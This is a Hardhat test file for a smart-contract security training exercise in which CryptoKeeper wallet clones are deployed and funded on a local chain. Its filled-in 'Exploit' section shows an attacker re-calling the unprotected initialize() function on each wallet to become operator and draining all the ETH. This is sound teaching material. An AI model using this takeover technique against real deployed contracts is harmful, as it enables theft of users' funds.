const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Calls Attacks Exercise 3', function () {

    let deployer, user1, user2, user3, attacker;

    const CALL_OPERATION = 1;

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, user3, attacker] = await ethers.getSigners();

        // Deploy ERC20 Token
        const TokenFactory = await ethers.getContractFactory(
            'contracts/utils/DummyERC20.sol:DummyERC20',
            deployer
        );
        this.token = await TokenFactory.deploy("Dummy ERC20", "DToken", ethers.utils.parseEther('1000'))

        // Deploy Template and Factory
        const CryptoKeeperTemplateFactory = await ethers.getContractFactory(
            'contracts/call-attacks-3/CryptoKeeper.sol:CryptoKeeper',
            deployer
        );
        this.cryptoKeeperTemplate = await CryptoKeeperTemplateFactory.deploy();
        // const CryptoKeeperTemplateFactory = await ethers.getContractFactory(
        //     'contracts/call-attacks-3/solution/CryptoKeeperSecured.sol:CryptoKeeperSecured',
        //     deployer
        // );
        // this.cryptoKeeperTemplate = await CryptoKeeperTemplateFactory.deploy();
        const CryptoKeeperFactoryFactory = await ethers.getContractFactory(
            'contracts/call-attacks-3/CryptoKeeperFactory.sol:CryptoKeeperFactory',
            deployer
        );
        this.cryptoKeeperFactory = await CryptoKeeperFactoryFactory.deploy(
            deployer.address, this.cryptoKeeperTemplate.address
        );

        // User1 creating CryptoKeepers
        const User1Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user1.address));
        const cryptoKeeper1Address = await this.cryptoKeeperFactory.predictCryptoKeeperAddress(User1Salt);
        await this.cryptoKeeperFactory.connect(user1).createCryptoKeeper(User1Salt, [user1.address])
        this.cryptoKeeper1 = await ethers.getContractAt(
            'contracts/call-attacks-3/CryptoKeeper.sol:CryptoKeeper',
            cryptoKeeper1Address
        );
        // User2 creating CryptoKeepers
        const User2Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user2.address));
        const cryptoKeeper2Address = await this.cryptoKeeperFactory.predictCryptoKeeperAddress(User2Salt);
        await this.cryptoKeeperFactory.connect(user2).createCryptoKeeper(User2Salt, [user2.address])
        this.cryptoKeeper2 = await ethers.getContractAt(
            'contracts/call-attacks-3/CryptoKeeper.sol:CryptoKeeper',
            cryptoKeeper2Address
        );
        // User3 creating CryptoKeepers
        const User3Salt = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(user3.address));
        const cryptoKeeper3Address = await this.cryptoKeeperFactory.predictCryptoKeeperAddress(User3Salt);
        await this.cryptoKeeperFactory.connect(user3).createCryptoKeeper(User3Salt, [user3.address])
        this.cryptoKeeper3 = await ethers.getContractAt(
            'contracts/call-attacks-3/CryptoKeeper.sol:CryptoKeeper',
            cryptoKeeper3Address
        );

        // Users load their cryptoKeeper with some ETH
        await user1.sendTransaction({
            to: this.cryptoKeeper1.address,
            value: ethers.utils.parseEther('10')
        });
        await user2.sendTransaction({
            to: this.cryptoKeeper2.address,
            value: ethers.utils.parseEther('10')
        });
        await user3.sendTransaction({
            to: this.cryptoKeeper3.address,
            value: ethers.utils.parseEther('10')
        });

        // cryptoKeeper operation works
        this.cryptoKeeper1.connect(user1).executeWithValue(
            user2.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
        )
        this.cryptoKeeper2.connect(user2).executeWithValue(
            user1.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
        )
        this.cryptoKeeper3.connect(user3).executeWithValue(
            user1.address, "0x", ethers.utils.parseEther('1'), {value: ethers.utils.parseEther('1')}
        )

        // Only operator can manage wallet
        // addOperator fails
        await expect(this.cryptoKeeper1.connect(user2).addOperator(user2.address)).to.be.revertedWith("Not an operator")
        // executeWithValue fails
        await expect(this.cryptoKeeper1.connect(user2).executeWithValue(
            user2.address, "0x", ethers.utils.parseEther('1'))).to.be.revertedWith("Not an operator")
        // execute fails
        const callData = TokenFactory.interface.encodeFunctionData('balanceOf', [deployer.address])
        await expect(this.cryptoKeeper1.connect(user2).execute(
            this.token.address, callData, CALL_OPERATION)).to.be.revertedWith("Not an operator");

        this.attackerInitialBalance = await ethers.provider.getBalance(attacker.address);
        
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        await this.cryptoKeeper1.connect(attacker).initialize([attacker.address]);
        await this.cryptoKeeper1.connect(attacker).executeWithValue(attacker.address, "0x", ethers.utils.parseEther('10'))
        await this.cryptoKeeper2.connect(attacker).initialize([attacker.address]);
        await this.cryptoKeeper2.connect(attacker).executeWithValue(attacker.address, "0x", ethers.utils.parseEther('10'))
        await this.cryptoKeeper3.connect(attacker).initialize([attacker.address]);
        await this.cryptoKeeper3.connect(attacker).executeWithValue(attacker.address, "0x", ethers.utils.parseEther('10'))
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker suppose to steal all the ETH from the Crypto Keepers
        expect(await ethers.provider.getBalance(this.cryptoKeeper1.address)).to.eq(0);
        expect(await ethers.provider.getBalance(this.cryptoKeeper2.address)).to.eq(0);
        expect(await ethers.provider.getBalance(this.cryptoKeeper3.address)).to.eq(0);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialBalance.add(ethers.utils.parseEther('30')).sub(ethers.utils.parseEther('0.2')));

    });
});
